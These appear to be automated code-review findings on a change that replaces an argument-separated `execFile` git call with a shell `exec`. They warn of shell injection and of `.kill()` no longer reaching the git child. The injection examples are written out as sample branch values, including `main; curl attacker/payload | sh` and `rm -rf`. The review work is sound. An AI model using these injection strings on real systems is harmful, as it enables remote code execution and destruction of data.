findings.title: [P1] Keep branch names out of the shell command
findings.body: When `branch` contains shell metacharacters, such as `HEAD; touch /tmp/pwned`, `exec` executes the appended command with the application's privileges. The previous `execFile("git", ["show", branch])` treated the value solely as a Git argument.

findings.title: [P2] Preserve direct child-process cancellation
findings.body: `exec` returns the shell process rather than the `git` process. Calling `.kill()` can terminate only the shell and leave a long-running `git show` child alive, changing the returned `ChildProcess` cancellation behavior.

findings.title: [P2] Keep Git as the directly cancellable child process
findings.body:
`exec()` returns the shell process rather than `git`. On Windows, or POSIX shells that retain a child instead of tail-executing it, calling `.kill()` on the returned process terminates only the shell and can leave a long-running `git show` alive. Consumers cancelling large output operations can therefore leak work and resources.

_Recommend validating this comment independently._

findings.title: [P1] Keep branch names out of a shell command
findings.body:
`exec` invokes a shell, so an input such as `showBranch("HEAD; rm -rf /tmp/example")` executes the appended command on POSIX systems. Any untrusted or valid metacharacter-containing branch value can cause arbitrary command execution; retain `execFile("git", ["show", branch])`.

_Recommend validating this comment independently._

findings.title: [P1] Restore argument-separated execution to prevent shell injection
findings.body:
`exec` invokes a shell and interpolates `branch` verbatim. Any untrusted value such as `main; curl attacker/payload | sh` executes arbitrary commands with the application’s privileges; the previous `execFile` call treated it solely as a Git argument.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell command
findings.body:
On POSIX, an attacker-controlled branch such as `HEAD;yes>/dev/null` starts an unbounded CPU-consuming process because `exec` invokes a shell. The callback never completes and the child remains active until explicitly killed.

_Recommend validating this comment independently._
